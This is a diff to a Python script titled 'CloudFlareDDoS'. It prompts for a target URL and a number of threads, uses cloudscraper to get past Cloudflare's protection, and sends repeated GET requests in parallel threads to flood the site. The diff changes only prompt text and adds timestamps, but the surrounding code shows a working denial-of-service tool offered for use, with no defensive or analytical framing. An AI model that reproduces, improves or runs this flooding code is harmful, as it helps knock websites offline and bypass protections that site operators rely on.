@@ -8,16 +8,16 @@ def check_url(url):
         cloudfare_check_url = requests.Session()
         response = cloudfare_check_url.get(url)
         if response.status_code == 200:
-            print("\033[92m root@HurryUp:~# The Url İs Valid \033[0m")
+            print("\033[92m root@hurryup:~# The Url İs Valid \033[0m")
         elif response.status_code == 404:
-            print("\033[91m root@HurryUp:~# The Url İs İnvalid \033[0m")
+            print("\033[91m root@hurryup:~# The Url İs İnvalid \033[0m")
     except:
         bypass = cloudscraper.create_scraper()
         response2 = bypass.get(url)
         if response2.status_code == 200:
-            print("\033[92m root@HurryUp:~# The Url İs Valid \033[0m")
+            print("\033[92m root@hurryup:~# The Url İs Valid \033[0m")
         elif response2.status_code == 404:
-            print("\033[91m root@HurryUp:~# The Url İs İnvalid \033[0m")
+            print("\033[91m root@hurryup:~# The Url İs İnvalid \033[0m")
 
 count = 0
 
@@ -33,10 +33,10 @@ def bypass(url, threads):
             response = r.get(url)
             count +=1
 
-            print("\033[92m\n" + f"root@HurryUp:~# Status Code : {response.status_code} Request Number: {count}" + "\n\033[0m")
+            print("\033[93m",time.ctime(time.time()),"\033[0m \033[92m\n" + f"root@hurryup:~# Status Code : {response.status_code} Request Number : {count}" + "\n\033[0m")
 
             response = bypass2.get(url)
-            print("\033[92m\n" + f"root@HurryUp:~# Status Code : {response.status_code} Request Number: {count}" + "\n\033[0m")
+            print("\033[93m",time.ctime(time.time()),"\033[0m \033[92m\n" + f"root@hurryup:~# Status Code : {response.status_code} Request Number : {count}" + "\n\033[0m")
 
     list_of_threads = []
 
@@ -64,9 +64,9 @@ print("\033[95m\____/_/\____/\__,_/\__,_/_/   /_/\__,_/_/   \___/_____/_____/\__
 print("\033[96m----------------------------CloudFlareDDoS--------------------------------- \033[0m")
 print(" ")
 
-url = input("\033[92m root@HurryUp:~# Enter The Target Url : \033[0m")
+url = input("\033[92m root@hurryup:~# Enter The Target Url : \033[0m")
 check_url(url)
 sleep(1)
 
-threads = input("\033[92m root@HurryUp:~# Enter The Number Of Threads : \033[0m")
+threads = input("\033[92m root@hurryup:~# Enter The Number Of Threads : \033[0m")
 bypass(url, threads)
